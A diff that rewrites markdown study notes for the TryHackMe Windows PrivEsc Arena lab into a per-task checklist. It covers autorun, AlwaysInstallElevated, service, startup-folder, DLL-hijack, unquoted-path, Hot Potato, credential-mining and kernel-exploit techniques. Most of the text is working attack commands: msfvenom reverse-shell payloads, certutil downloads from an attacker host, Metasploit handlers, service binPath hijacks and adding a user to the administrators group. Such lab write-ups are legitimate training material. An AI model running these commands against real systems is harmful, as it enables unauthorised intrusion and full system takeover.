@@ -1,357 +1,362 @@
-# TryHackMe — Windows PrivEsc Arena
+# TryHackMe – Windows PrivEsc Arena: Technique Notes (with machine labels)
 
-**Room:** [tryhackme.com/room/windowsprivescarena](https://tryhackme.com/room/windowsprivescarena)
-**Difficulty:** Medium
-**Category:** Windows Privilege Escalation
+General workflow: get a low-priv foothold on target (via RDP) → enumerate with `accesschk64.exe`, Autoruns, `whoami /priv`, `net user` → identify the misconfiguration → escalate to SYSTEM/Admin.
 
-A hands-on room covering the most common Windows local privilege escalation vectors: registry misconfigurations, weak service permissions, unquoted paths, DLL hijacking, potato exploits, credential mining, and kernel exploits.
+Legend: 🐧 = run on Kali (attacker) | 🪟 = run on Windows target (inside RDP session)
 
 ---
 
-## Table of Contents
+## Task 3 – Registry Escalation: Autorun
+🪟 Use Autoruns / `accesschk64.exe` to find autorun registry entries pointing to a file path your user can write to.
 
-- [Setup — Connecting to the THM VPN](#setup--connecting-to-the-thm-vpn)
-- [Task 2 — Deploy the Machine](#task-2--deploy-the-machine)
-- [Task 3 — Registry Escalation: Autorun](#task-3--registry-escalation-autorun)
-- [Task 4 — Registry Escalation: AlwaysInstallElevated](#task-4--registry-escalation-alwaysinstallelevated)
-- [Task 5 — Service Escalation: Registry](#task-5--service-escalation-registry)
-- [Task 6 — Service Escalation: Executable Files](#task-6--service-escalation-executable-files)
-- [Task 7 — Startup Applications](#task-7--startup-applications)
-- [Task 8 — Service Escalation: DLL Hijacking](#task-8--service-escalation-dll-hijacking)
-- [Task 9 — Service Escalation: binPath (Weak DACL)](#task-9--service-escalation-binpath-weak-dacl)
-- [Task 10 — Unquoted Service Paths](#task-10--unquoted-service-paths)
-- [Task 11 — Potato Escalation: Hot Potato](#task-11--potato-escalation-hot-potato)
-- [Task 12 — Password Mining: Configuration Files](#task-12--password-mining-configuration-files)
-- [Task 13 — Password Mining: Memory](#task-13--password-mining-memory)
-- [Task 14 — Kernel Exploits](#task-14--kernel-exploits)
-- [Summary Table](#summary-table)
-
----
-
-## Setup — Connecting to the THM VPN
-
-```bash
-# Download your .ovpn from TryHackMe → Access → OpenVPN
-mkdir -p ~/thm && mv ~/Downloads/*.ovpn ~/thm/
-
-# Connect (leave running in its own terminal)
-sudo openvpn ~/thm/yourfile.ovpn
-
-# In a new tab, verify the tunnel
-ip a tun0
-ping <target-ip>
+🐧 Generate payload:
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o shell.exe
 ```
 
----
-
-## Task 2 — Deploy the Machine
-
-1. Click **Start Machine** on the room page and note the assigned IP.
-2. RDP into the box with the provided credentials:
-
-```bash
-xfreerdp /u:<user> /p:<pass> /v:<target-ip> /cert:ignore
+🐧 Host it:
 ```
-
-3. Enumerate local users:
-
-```
-net user
-```
-
-**Answer:** the other non-default user is `TCM`.
-
----
-
-## Task 3 — Registry Escalation: Autorun
-
-**Concept:** Binaries referenced in `HKLM\...\Run` execute at every logon, including admin logons. If the file/folder is writable by a low-privileged user, it can be replaced.
-
-```
-# Inspect autorun entries
-Autoruns64.exe        # check the Logon tab
-
-# Check folder/file permissions
-accesschk64.exe -uwqv "Users" C:\path\to\autorun\folder
-```
-
-Generate and serve a payload:
-
-```bash
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali-ip> LPORT=4444 -f exe -o shell.exe
 python3 -m http.server 8000
 ```
 
-Pull it down on the target and replace the autorun binary:
-
+🐧 Start listener:
 ```
-certutil.exe -urlcache -f http://<kali-ip>:8000/shell.exe program.exe
-```
-
-Set up the handler:
-
-```
-msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST <kali-ip>; set LPORT 4444; run"
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <attacker_ip>
+set LPORT 4444
+run
 ```
 
-> **Note:** If ACLs deny write access to non-admins on the autorun path, this vector is correctly blocked — worth documenting as a negative finding rather than a failure.
+🪟 Pull payload to target:
+```
+certutil.exe -urlcache -f http://<attacker_ip>:8000/shell.exe shell.exe
+```
+
+🪟 Replace the autorun binary with your payload if write access allows it.
+- Note: in this room, the autorun folder actually requires admin rights to write to despite `accesschk` showing everyone with read/write.
 
 ---
 
-## Task 4 — Registry Escalation: AlwaysInstallElevated
-
-**Concept:** If both registry keys below are set to `1`, any user can install an `.msi` with SYSTEM privileges.
-
+## Task 4 – Registry Escalation: AlwaysInstallElevated
+🪟 Check both registry keys are set to `1`:
 ```
-reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 ```
 
-Generate a malicious MSI:
-
-```bash
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali-ip> LPORT=4444 -f msi -o setup.msi
+🐧 Build malicious MSI:
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f msi -o setup.msi
 ```
 
-Transfer and install on target:
-
+🐧 Host it:
 ```
-certutil.exe -urlcache -f http://<kali-ip>:8000/setup.msi setup.msi
+python3 -m http.server 8000
+```
+
+🐧 Start listener:
+```
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <attacker_ip>
+set LPORT 4444
+run
+```
+
+🪟 Download and run on target — installs as SYSTEM:
+```
+certutil.exe -urlcache -f http://<attacker_ip>:8000/setup.msi setup.msi
 msiexec /quiet /qn /i setup.msi
 ```
 
-Catch the shell on the handler → **NT AUTHORITY\SYSTEM**.
-
 ---
 
-## Task 5 — Service Escalation: Registry
-
-**Concept:** If a service's `ImagePath` registry value is writable by your user, point it at your own binary — it runs with the service's (SYSTEM) privileges on start.
-
+## Task 5 – Service Escalation: Registry
+🪟 Find a service whose registry key is writable by your user:
 ```
-accesschk64.exe -kvuqsw hklm\system\currentcontrolset\services\regsvc
+accesschk64.exe -kvuqsw hklm\system\currentcontrolset\services
 ```
 
-If `Users` have write/full control:
-
+🐧 Generate payload:
 ```
-reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\temp\shell.exe /f
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o shell.exe
+```
+
+🐧 Host it:
+```
+python3 -m http.server 8000
+```
+
+🐧 Start listener:
+```
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <attacker_ip>
+set LPORT 4444
+run
+```
+
+🪟 Pull payload to target:
+```
+certutil.exe -urlcache -f http://<attacker_ip>:8000/shell.exe shell.exe
+```
+
+🪟 Point ImagePath at your payload and start the service:
+```
+reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\shell.exe /f
 net start regsvc
 ```
 
-Catch shell → SYSTEM.
+---
+
+## Task 6 – Service Escalation: Executable Files
+🪟 Find a service binary (the actual .exe, not the registry key) that your user can overwrite (check with `accesschk64.exe -uwdq <path>`).
+
+🐧 Generate payload:
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o shell.exe
+```
+
+🐧 Host it:
+```
+python3 -m http.server 8000
+```
+
+🐧 Start listener:
+```
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <attacker_ip>
+set LPORT 4444
+run
+```
+
+🪟 Pull payload, stop service, overwrite binary, restart:
+```
+certutil.exe -urlcache -f http://<attacker_ip>:8000/shell.exe shell.exe
+net stop <svc>
+copy /y shell.exe "C:\path\to\service.exe"
+net start <svc>
+```
 
 ---
 
-## Task 6 — Service Escalation: Executable Files
-
-**Concept:** The service binary itself on disk is writable, rather than the registry key.
-
+## Task 7 – Privilege Escalation: Startup Applications
+🪟 Check ACLs on the global Startup folder:
 ```
-accesschk64.exe -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
+icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
 ```
 
-If writable:
-
+🐧 Generate payload:
 ```
-copy /y shell.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
-net start filepermservice
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o shell.exe
 ```
 
-Catch shell → SYSTEM.
+🐧 Host it:
+```
+python3 -m http.server 8000
+```
+
+🐧 Start listener:
+```
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <attacker_ip>
+set LPORT 4444
+run
+```
+
+🪟 Pull payload and drop it in the Startup folder:
+```
+certutil.exe -urlcache -f http://<attacker_ip>:8000/shell.exe shell.exe
+copy shell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\shell.exe"
+```
+
+🪟 Log off and back on (or wait for an admin/other user to log in via RDP) to trigger execution.
 
 ---
 
-## Task 7 — Startup Applications
+## Task 8 – Service Escalation: DLL Hijacking
+🪟 Use Process Monitor (filter: `Result is NAME NOT FOUND`, `Path ends with .dll`) to find a DLL the service tries to load from a path you can write to.
 
-**Concept:** Files in the all-users Startup folder run for *any* user who logs in, including administrators.
-
+🐧 Build malicious DLL:
 ```
-icacls "C:\Users\All Users\Microsoft\Windows\Start Menu\Programs\StartUp"
-```
-
-If `BUILTIN\Users` has write access:
-
-```
-copy shell.exe "C:\Users\All Users\Microsoft\Windows\Start Menu\Programs\StartUp\shell.exe"
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f dll -o hijackme.dll
 ```
 
-Start a handler, then wait for (or trigger) another user's logon (e.g. RDP as `TCM`). The payload fires on next logon, returning a shell as that user.
+🐧 Host it:
+```
+python3 -m http.server 8000
+```
 
----
+🐧 Start listener:
+```
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <attacker_ip>
+set LPORT 4444
+run
+```
 
-## Task 8 — Service Escalation: DLL Hijacking
+🪟 Pull DLL into the missing-DLL path:
+```
+certutil.exe -urlcache -f http://<attacker_ip>:8000/hijackme.dll hijackme.dll
+```
 
-**Concept:** A service searches for a DLL it can't find, or from a directory you control — drop a malicious DLL matching the expected name.
-
-1. Open **Process Monitor**, filter: `Result = NAME NOT FOUND`, `Path ends with .dll`, Process = the vulnerable service binary.
-2. Restart the service to trigger the search:
-
+🪟 Restart the vulnerable service to load it:
 ```
 net stop dllsvc & net start dllsvc
 ```
 
-3. Build a matching malicious DLL:
-
-```bash
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali-ip> LPORT=4444 -f dll -o hijackme.dll
-```
-
-4. Transfer it into the expected path and restart the service:
-
-```
-certutil.exe -urlcache -f http://<kali-ip>:8000/hijackme.dll hijackme.dll
-net stop dllsvc & net start dllsvc
-```
-
-> If no callback returns, verify the DLL's exports match what the service actually calls — msfvenom's default export table doesn't always line up.
-
 ---
 
-## Task 9 — Service Escalation: binPath (Weak DACL)
-
-**Concept:** If your user has `SERVICE_CHANGE_CONFIG` rights on a service, you can repoint its binary path directly — no file/registry write access needed.
-
+## Task 9 – Service Escalation: binPath
+🪟 Find a service you can directly reconfigure (weak service permissions, not just registry):
 ```
-accesschk64.exe -uwcqv "Users" daclsvc
+accesschk64.exe -uwcqv <user> *
 ```
 
-If `SERVICE_ALL_ACCESS` / `SERVICE_CHANGE_CONFIG` is granted to `Users`:
-
+🐧 Generate payload:
 ```
-sc config daclsvc binpath= "net localgroup administrators <youruser> /add"
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o shell.exe
+```
+
+🐧 Host it:
+```
+python3 -m http.server 8000
+```
+
+🐧 Start listener:
+```
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <attacker_ip>
+set LPORT 4444
+run
+```
+
+🪟 Pull payload, reconfigure service binPath, start it:
+```
+certutil.exe -urlcache -f http://<attacker_ip>:8000/shell.exe shell.exe
+sc config daclsvc binpath= "C:\temp\shell.exe"
 net start daclsvc
 ```
 
-Log off/on to reflect new group membership.
-
 ---
 
-## Task 10 — Unquoted Service Paths
-
-**Concept:** An unquoted path like `C:\Program Files\Unquoted Path Service\common.exe` lets Windows try each space-delimited segment as an executable (`C:\Program.exe`, `C:\Program Files\Unquoted.exe`, etc). A writable folder in that chain = code execution as the service account.
-
+## Task 10 – Service Escalation: Unquoted Service Paths
+🪟 Find an unquoted service path with spaces:
 ```
-wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows"
-icacls "C:\Program Files\Unquoted Path Service\"
+wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
+```
+e.g.:
+`C:\Program Files\Unquoted Path Service\common files\service.exe`
+
+🐧 Generate payload:
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o common.exe
 ```
 
-Drop the payload matching the exposed segment name:
-
+🐧 Host it:
 ```
-copy shell.exe "C:\Program Files\Unquoted Path Service\common.exe"
+python3 -m http.server 8000
+```
+
+🐧 Start listener:
+```
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <attacker_ip>
+set LPORT 4444
+run
+```
+
+🪟 Pull payload into an earlier path segment (e.g. `C:\Program Files\Unquoted Path Service\common.exe`) and start service:
+```
+certutil.exe -urlcache -f http://<attacker_ip>:8000/common.exe common.exe
 sc start unquotedsvc
 ```
 
-Catch shell → SYSTEM.
-
 ---
 
-## Task 11 — Potato Escalation: Hot Potato
-
-**Concept:** NBNS spoofing + fake WPAD coerce a SYSTEM-level service to authenticate to you via NTLM, which is then relayed to escalate privileges. Effective on older/unpatched builds.
-
+## Task 11 – Potato Escalation: Hot Potato
+🪟 Run the exploit tool from an elevated-ish PowerShell (bypassing execution policy):
 ```
 powershell -ep bypass
-Import-Module .\Tater.ps1
-Invoke-Tater -Trigger 1
+```
+Then execute the Hot Potato / Tater exploit binary (transferred from Kali the same way as above via `certutil.exe`), which relays NTLM auth to escalate to SYSTEM.
+
+🐧 (Optional) Set up a listener if the exploit is configured to spawn a reverse shell as part of its payload:
+```
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <attacker_ip>
+set LPORT 4444
+run
 ```
 
-Confirm escalation:
-
+🪟 Verify escalation:
 ```
 net localgroup administrators
 ```
 
 ---
 
-## Task 12 — Password Mining: Configuration Files
-
-**Concept:** Deployment/config files often retain credentials — `Unattend.xml`, `web.config`, `Sysprep.inf`. Passwords in `Unattend.xml` are Base64-encoded, not encrypted.
-
+## Task 12 – Password Mining: Configuration Files
+🪟 Check Unattend.xml for leftover creds:
 ```
 type C:\Windows\Panther\Unattend.xml
 ```
 
-or search broadly:
-
+🐧 or 🪟 Decode the Base64 password (either machine works, shown as Kali here):
 ```
-dir /s /b unattend.xml sysprep.inf sysprep.xml web.config
+echo <base64string> | base64 -d
 ```
-
-Decode the `<Password>` value:
-
-```bash
-echo "<base64string>" | base64 -d
-```
-
-**Answer:** `password123`
+Answer: `password123`
 
 ---
 
-## Task 13 — Password Mining: Memory
-
-**Concept:** Applications sometimes hold credentials in process memory (e.g. a browser mid-HTTP Basic Auth prompt). Dumping the process and searching strings can recover the cleartext.
-
-1. Trigger the credential prompt (e.g. a Metasploit `auxiliary/server/capture/http_basic` module hit via Internet Explorer).
-2. Task Manager → right-click the process (`iexplore.exe`) → **Create Dump File**.
-3. Search the dump:
-
+## Task 13 – Password Mining: Memory
+🐧 Start an HTTP Basic Auth capture listener:
 ```
-strings iexplore.DMP | findstr /i "password"
+use auxiliary/server/capture/http_basic
+set SRVPORT 80
+run
 ```
+
+🪟 Trigger a target application (e.g. Internet Explorer) to authenticate to that listener over HTTP, or dump a running process's memory via Task Manager → right-click process → "Create dump file".
+
+🐧 or 🪟 Search the resulting dump/capture for cleartext credentials (e.g. using `strings` on Kali if you exfil the dump).
 
 ---
 
-## Task 14 — Kernel Exploits
-
-**Concept:** When no config/service misconfig exists, an unpatched kernel CVE can grant SYSTEM directly.
-
-From an existing low-priv meterpreter session:
-
+## Task 14 – Privilege Escalation: Kernel Exploits
+🐧 Generate payload and start listener as usual:
 ```
-background
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o shell.exe
+python3 -m http.server 8000
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <attacker_ip>
+set LPORT 4444
+run
+```
+
+🪟 Pull and execute payload to get initial Meterpreter session:
+```
+certutil.exe -urlcache -f http://<attacker_ip>:8000/shell.exe shell.exe
+shell.exe
+```
+
+🐧 From the Meterpreter session (background it first with `bg`), run the local exploit suggester:
+```
 use post/multi/recon/local_exploit_suggester
 set SESSION <id>
 run
 ```
 
-Use the suggested exploit matching the target's patch level — this room's intended path is **MS16-014**:
-
-```
-use exploit/windows/local/ms16_014_wmi_recv_notif
-set SESSION <id>
-set LHOST <kali-ip>
-run
-```
+🐧 Select and run a matching kernel exploit module (e.g. `MS16-014`) against the session to escalate to SYSTEM.
 
 ---
-
-## Summary Table
-
-| Task | Technique                        | Result                          |
-|------|-----------------------------------|----------------------------------|
-| 3    | Autorun registry                  | Blocked by ACL (documented)     |
-| 4    | AlwaysInstallElevated              | SYSTEM                          |
-| 5    | Service registry `ImagePath`       | SYSTEM                          |
-| 6    | Writable service executable        | SYSTEM                          |
-| 7    | Startup folder                     | Shell as `TCM-PC\TCM`           |
-| 8    | DLL Hijacking                      | SYSTEM (export match required)  |
-| 9    | Weak service DACL / binPath        | Local Admin                     |
-| 10   | Unquoted service path              | SYSTEM                          |
-| 11   | Hot Potato                         | Local Admin                     |
-| 12   | Unattend.xml                       | Credential: `password123`       |
-| 13   | Memory dump                        | Credential recovered            |
-| 14   | MS16-014 kernel exploit            | SYSTEM                          |
-
----
-
-## References
-
-- [TryHackMe — Windows PrivEsc Arena](https://tryhackme.com/room/windowsprivescarena)
-- [GTFOBins / LOLBAS](https://lolbas-project.github.io/) — for living-off-the-land techniques
-- [PayloadsAllTheThings — Windows PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
-
----
-
-*Notes written for personal study / CTF documentation purposes.*
+*Notes condensed from a public TryHackMe walkthrough for personal reference/study.*
